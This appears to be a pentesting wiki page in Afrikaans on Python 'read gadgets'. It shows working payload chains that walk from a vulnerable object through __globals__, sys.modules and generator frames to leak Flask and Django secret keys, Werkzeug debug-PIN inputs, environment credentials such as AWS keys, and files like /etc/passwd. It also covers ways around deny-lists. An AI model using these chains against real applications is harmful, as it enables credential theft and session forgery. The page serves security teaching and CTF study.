# Python Internal Read Gadgets

## Basiese Inligting

Verskillende kwesbaarhede soos [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) of [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) kan jou moontlik toelaat om **interne Python-data te lees, maar sal jou nie toelaat om code uit te voer nie**. Daarom sal ’n pentester hierdie leestoestemmings ten beste moet benut om **sensitiewe privileges te verkry en die kwesbaarheid te eskaleer**.

### Flask - Lees geheime sleutel

Die hoofblad van ’n Flask-toepassing sal waarskynlik die **`app`**-globale objek hê waar hierdie **geheim gekonfigureer is**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In hierdie geval is dit moontlik om toegang tot hierdie objek te verkry deur eenvoudig enige gadget te gebruik om **globale objekte te benader** vanaf die [**Bypass Python sandboxes-bladsy**](bypass-python-sandboxes/index.html).

In die geval waar **die kwesbaarheid in ’n ander Python-lêer is**, het jy ’n gadget nodig om deur lêers te navigeer om by die hooflêer uit te kom, sodat jy toegang tot die globale objek `app.secret_key` kan verkry en [**escalate privileges** met kennis van hierdie sleutel](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) kan uitvoer.

’n Payload soos hierdie een [uit hierdie writeup](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Gebruik hierdie payload om **app.secret_key te lees**. As die oorspronklike bug jou ook 'n write primitive gee (byvoorbeeld class pollution), kan dieselfde pad gebruik word om dit te vervang en meer bevoorregte Flask cookies te sign.

### Werkzeug - machine_id en node uuid

[**Deur hierdie payload uit hierdie writeup te gebruik**](https://vozec.fr/writeups/tweedle-dum-dee/) sal jy toegang tot die **machine_id** en die **uuid** node kry, wat die **private bits** is wat jy nodig het om die [**Werkzeug pin te genereer**](../../network-services-pentesting/pentesting-web/werkzeug.md) en toegang tot die Python console in `/console` te kry as die **debug mode geaktiveer is**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Let daarop dat jy die **bediener se plaaslike pad na die `app.py`** kan kry deur 'n **fout** op die webblad te genereer wat die **pad sal vertoon**.

As die kwesbaarheid in 'n ander Python-lêer is, kyk na die vorige Flask-truuk om toegang tot die objekte vanuit die hoof-Python-lêer te verkry.

### Django - SECRET_KEY en settings-module

Die Django settings-objek word in `sys.modules` gekas sodra die toepassing begin. Met slegs read primitives kan jy die **`SECRET_KEY`**, fallback-sleutels, databasis-geloofsbriewe of signing salts lek:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
As die kwesbare gadget in ’n ander module is, loop eers deur globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` is net so waardevol soos die huidige `SECRET_KEY`: hulle valideer steeds ou ondertekende waardes tydens rotation.<sup>[[1]](#references)</sup> Lek ook `SESSION_ENGINE` en `SESSION_SERIALIZER` om vinnig te bepaal of die impak slegs cookie forgery is of iets sterker. Vir besonderhede oor die webimpak, raadpleeg die [**Django pentesting-bladsy**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - lees bronkode en lêers

Gelaaide Python-modules behou gewoonlik ’n `__loader__`. Lêergebaseerde loaders stel dikwels `get_source()` en `get_data()` bloot, wat perfekte **leesalleen-primitives** is wanneer jy reeds toegang tot ’n module-object het, maar nie tot `open()` nie:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Dit is baie nuttig om **config modules, blueprints, helper files of hidden routes** te dump en API keys, DSNs, flag paths of additional gadget entry points te herwin.

As jy slegs subclass enumeration het, soek die loader volgens naam in plaas daarvan om ’n indeks hard-coded te gebruik:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals van generator-/coroutine-raamwerk

As jy ’n generator-/coroutine-objek kan skep of bereik, kan sy raamwerk globals uitlek **sonder dat enige funksie se `__globals__`-gadget nodig is**. Dit is nuttig teen filters wat slegs dunder-name blokkeer en raamwerkattribute soos `gi_frame`, `ag_frame`, `cr_frame` of `f_globals` vergeet:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Sodra jy die frame globals het, gaan presies voort soos met die ander gadgets (`sys.modules`, settings objects, `os.environ`, ens.). Onlangse sandbox escapes ontdek dit steeds weer, omdat `gi_frame` en `f_globals` nie dunder attributes is nie en dikwels naïewe deny-lists oorleef.

### Omgewingsveranderlikes / cloud creds via loaded modules

Baie jails importeer steeds êrens `os` of `sys`. Jy kan enige bereikbare funksie se `__init__.__globals__` misbruik om na die reeds geïmporteerde `os`-module te pivot en **omgewingsveranderlikes** te dump wat API-tokens, cloud keys of flags bevat:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
As die subclass-indeks gefiltreer word, gebruik loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Omgewingsveranderlikes is dikwels die enigste geheime wat nodig is om van lees-toegang na volledige kompromittering te beweeg (cloud IAM-sleutels, databasis-URL's, signing keys, ens.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), geaffekteerde weergawes `<0.61.0`) het **class pollution** deur vervaardigde komponentversoeke toegelaat. 'n Eienskapspad soos `__init__.__globals__` kon komponentmodule-globals en ingevoerde modules bereik; die advisory demonstreer die oorskryf van Django se `SECRET_KEY` en waardes in `os.environ`, eerder as 'n leesalleen-uitbuiting.<sup>[[5]](#references)</sup> Indien 'n afsonderlike fout leestoegang tot dieselfde objekgrafiek bied, kan daardie globals konfigurasie en geloofsbriewe blootlê sonder dat kode-uitvoering nodig is.

### Gadget collections for chaining

Onlangse CTF's en pyjail-navorsing toon betroubare leeskettings wat slegs met attribuuttoegang en subclass-enumerasie gebou is. Gemeenskapsbeheerde lyste soos [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogiseer honderde minimale gadgets wat jy kan kombineer om van objekte na `__globals__`, `sys.modules` en uiteindelik sensitiewe data te navigeer.<sup>[[2]](#references)</sup> Verkies **attribuut-/naamgebaseerde soektogte** bo rou subclass-indekse, omdat die posisie van `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, ens. tussen Python-weergawes en met ekstra ingevoerde libraries verander.

## References

- [1] [Django-dokumentasie oor kriptografiese signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox-gadgetwiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / taakbestuurder / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 Writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution-kwesbaarheid, wat tot RCE, XSS, DoS en Authentication Bypass lei (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
